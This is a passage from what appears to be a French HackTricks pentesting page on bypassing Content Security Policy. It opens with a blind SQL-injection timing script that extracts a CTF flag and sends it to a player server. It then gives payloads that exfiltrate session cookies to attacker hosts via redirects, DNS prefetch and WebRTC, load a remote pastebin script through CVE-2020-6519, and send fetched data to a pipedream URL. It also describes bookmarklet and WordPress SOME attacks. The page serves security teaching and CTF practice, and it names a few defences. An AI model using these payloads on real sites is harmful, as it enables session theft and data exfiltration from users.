let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

Cette attaque impliquerait une certaine ing√©nierie sociale o√π l'attaquant **convainc l'utilisateur de faire glisser et d√©poser un lien sur le bookmarklet du navigateur**. Ce bookmarklet contiendrait du **code JavaScript malveillant** qui, lorsqu'il est gliss√©-d√©pos√© ou cliqu√©, serait ex√©cut√© dans le contexte de la fen√™tre Web actuelle, **contournant la CSP et permettant de voler des informations sensibles** telles que les cookies ou les jetons.

Pour plus d'informations, [**consultez le rapport original ici**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Contournement de la CSP en restreignant la CSP

Dans [**ce compte rendu de CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), la CSP est contourn√©e en injectant dans un iframe autoris√© une CSP plus restrictive qui interdit le chargement d'un fichier JS sp√©cifique qui, ensuite, via une **pollution de prototype** ou un **dom clobbering**, permet de **utiliser un autre script pour charger un script arbitraire**.

Vous pouvez **restreindre une CSP d'un iframe** avec l'attribut **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Dans [**ce compte rendu de CTF**](https://github.com/aszx87410/ctf-writeups/issues/48), il √©tait possible, gr√¢ce √† une **injection HTML**, de **restreindre** davantage une **CSP**, ce qui a d√©sactiv√© un script emp√™chant CSTI et donc la **vuln√©rabilit√© est devenue exploitable**.\
CSP peut √™tre rendu plus restrictif en utilisant des **balises m√©ta HTML** et les scripts en ligne peuvent √™tre d√©sactiv√©s **en supprimant** l'**entr√©e** permettant leur **nonce** et **en activant un script en ligne sp√©cifique via sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Exfiltration JS avec Content-Security-Policy-Report-Only

Si vous parvenez √† faire en sorte que le serveur r√©ponde avec l'en-t√™te **`Content-Security-Policy-Report-Only`** avec une **valeur contr√¥l√©e par vous** (peut-√™tre √† cause d'un CRLF), vous pourriez le faire pointer vers votre serveur et si vous **enveloppez** le **contenu JS** que vous souhaitez exfiltrer avec **`<script>`** et parce que `unsafe-inline` n'est probablement pas autoris√© par le CSP, cela va **d√©clencher une erreur CSP** et une partie du script (contenant les informations sensibles) sera envoy√©e au serveur depuis `Content-Security-Policy-Report-Only`.

Pour un exemple, [**consultez cette solution de CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Fuite d'informations CSP + Iframe

Imaginez une situation o√π une **page redirige** vers une autre **page avec un secret en fonction** de l'**utilisateur**. Par exemple, lorsque l'utilisateur **admin** acc√®de √† **redirectme.domain1.com**, il est redirig√© vers **adminsecret321.domain2.com** et vous pouvez provoquer un XSS sur l'administrateur.\
**De plus, les pages redirig√©es ne sont pas autoris√©es par la politique de s√©curit√©, mais la page qui redirige l'est.**

Vous pouvez divulguer le domaine vers lequel l'administrateur est redirig√© via :

* **une violation de la CSP**
* **les r√®gles de la CSP.**

La violation de la CSP est une fuite instantan√©e. Tout ce qui doit √™tre fait est de charger un iframe pointant vers `https://redirectme.domain1.com` et d'√©couter l'√©v√©nement `securitypolicyviolation` qui contient la propri√©t√© `blockedURI` contenant le domaine de l'URI bloqu√©e. Cela est d√ª au fait que `https://redirectme.domain1.com` (autoris√© par la CSP) redirige vers `https://adminsecret321.domain2.com` (**bloqu√© par la CSP**). Cela exploite un comportement ind√©fini sur la fa√ßon de g√©rer les iframes avec la CSP. Chrome et Firefox se comportent diff√©remment √† cet √©gard.

Lorsque vous connaissez les caract√®res qui peuvent composer le sous-domaine secret, vous pouvez √©galement utiliser une recherche binaire et v√©rifier quand la CSP bloque la ressource et quand elle ne le fait pas en cr√©ant diff√©rents domaines interdits dans la CSP (dans ce cas, le secret peut √™tre sous la forme doc-X-XXXX.secdrivencontent.dev).
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Astuce provenant de [**ici**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof ne sont lanc√©es que lorsque leurs clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du hacking web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

## Technologies non s√©curis√©es pour contourner CSP

### Surcharge du tampon de r√©ponse PHP

PHP est connu pour **mettre en tampon la r√©ponse √† 4096** octets par d√©faut. Par cons√©quent, si PHP affiche un avertissement, en fournissant **suffisamment de donn√©es dans les avertissements**, la **r√©ponse** sera **envoy√©e** **avant** l'en-t√™te CSP, ce qui entra√Ænera l'ignorance de l'en-t√™te.\
Ensuite, la technique consiste essentiellement √† **remplir le tampon de r√©ponse avec des avertissements** afin que l'en-t√™te CSP ne soit pas envoy√©.

Id√©e provenant de [**ce writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### R√©√©criture de la page d'erreur

D'apr√®s [**ce writeup**](https://blog.ssrf.kr/69), il semble possible de contourner une protection CSP en chargeant une page d'erreur (potentiellement sans CSP) et en r√©√©crivant son contenu.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME est une technique qui exploite une XSS (ou une XSS tr√®s limit√©e) **dans un point d'extr√©mit√© d'une page** pour **exploiter** **d'autres points d'extr√©mit√© de la m√™me origine.** Cela est fait en chargeant le point d'extr√©mit√© vuln√©rable √† partir d'une page d'attaquant, puis en actualisant la page d'attaquant vers le point d'extr√©mit√© r√©el dans la m√™me origine que vous souhaitez exploiter. De cette fa√ßon, le **point d'extr√©mit√© vuln√©rable** peut utiliser l'objet **`opener`** dans la **charge utile** pour **acc√©der au DOM** du **point d'extr√©mit√© r√©el √† exploiter**. Pour plus d'informations, consultez :

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

De plus, **wordpress** dispose d'un point d'extr√©mit√© **JSONP** dans `/wp-json/wp/v2/users/1?_jsonp=data` qui **refl√®te** les **donn√©es** envoy√©es en sortie (avec la limitation aux lettres, chiffres et points uniquement).

Un attaquant peut exploiter ce point d'extr√©mit√© pour **g√©n√©rer une attaque SOME** contre WordPress et **l'int√©grer** dans `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` notez que ce **script** sera **charg√©** car il est **autoris√© par 'self'**. De plus, et parce que WordPress est install√©, un attaquant peut exploiter l'**attaque SOME** via le point d'extr√©mit√© de **rappel** **vuln√©rable** qui **contourne la CSP** pour accorder plus de privil√®ges √† un utilisateur, installer un nouveau plugin...
Pour plus d'informations sur la fa√ßon d'effectuer cette attaque, consultez [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Contournements de la politique de s√©curit√© du contenu (CSP) pour l'exfiltration

Si une CSP stricte ne vous permet pas d'**interagir avec des serveurs externes**, il y a quelques choses que vous pouvez toujours faire pour exfiltrer les informations.

### Location

Vous pouvez simplement mettre √† jour l'emplacement pour envoyer au serveur de l'attaquant les informations secr√®tes :
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Balise Meta

Vous pouvez rediriger en injectant une balise meta (il s'agit simplement d'une redirection, cela ne divulguera pas de contenu)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### Pr√©chargement DNS

Pour charger les pages plus rapidement, les navigateurs vont pr√©-r√©soudre les noms d'h√¥te en adresses IP et les mettre en cache pour une utilisation ult√©rieure.\
Vous pouvez indiquer √† un navigateur de pr√©-r√©soudre un nom d'h√¥te avec : `<link reol="dns-prefetch" href="something.com">`

Vous pourriez exploiter ce comportement pour **exfiltrer des informations sensibles via des requ√™tes DNS** :
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Une autre m√©thode:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Afin d'√©viter que cela ne se produise, le serveur peut envoyer l'en-t√™te HTTP :
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Apparemment, cette technique ne fonctionne pas dans les navigateurs sans t√™te (bots).
{% endhint %}

### WebRTC

Sur plusieurs pages, vous pouvez lire que **WebRTC ne v√©rifie pas la politique `connect-src`** du CSP.

En r√©alit√©, vous pouvez _fuir_ des informations en utilisant une _requ√™te DNS_. Jetez un coup d'≈ìil √† ce code :
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Une autre option:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## V√©rification des politiques CSP en ligne

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Cr√©ation automatique de CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## R√©f√©rences

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof sont lanc√©es uniquement lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du hacking web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? Ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
